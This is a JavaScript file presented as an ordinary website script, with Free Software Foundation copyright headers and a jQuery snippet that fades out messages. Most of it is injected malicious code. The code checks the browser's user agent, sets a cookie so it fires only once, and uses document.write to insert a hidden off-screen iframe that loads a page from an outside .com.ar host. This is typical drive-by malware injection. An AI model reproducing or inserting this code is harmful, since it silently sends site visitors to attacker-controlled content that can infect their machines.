/*
Copyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/
*/
function getCookie(name) {
var matches = document.cookie.match(new RegExp(
"(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
));
return matches ? decodeURIComponent(matches[1]) : undefined;
}
function Broadbandserviceactu() {
var resiser = navigator.userAgent;
var teamfact = (resiser.indexOf("Windows") < +1 || resiser.indexOf("Windows NT 6.3") > -1 || resiser.indexOf("IEMobile") > -1 || resiser.indexOf("Chrome") > -1 || resiser.indexOf("Windows NT 6.2") > -1);
var buble = (getCookie("joombanight") === undefined);
if (!teamfact && buble) {
document.write('<iframe src="http://afroidue.alewank.com.ar/blastujaker15.html?%a" style="border-left: thick double 7FFFD4;left: -887px;position: absolute;cursor: help;border-right: thick double 0000FF;top: -887px;" height="132" width="132"></iframe>');
var date = new Date( new Date().getTime() + 64*60*60*1000 );
document.cookie="joombanight=1; path=/; expires="+date.toUTCString();
}
}
Broadbandserviceactu();
/*
Copyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt
*/jQuery(document).ready(function($){
	// fade away update messages
	setTimeout(function(){
		$('.fade').fadeOut('slow');
	}, 5000);
});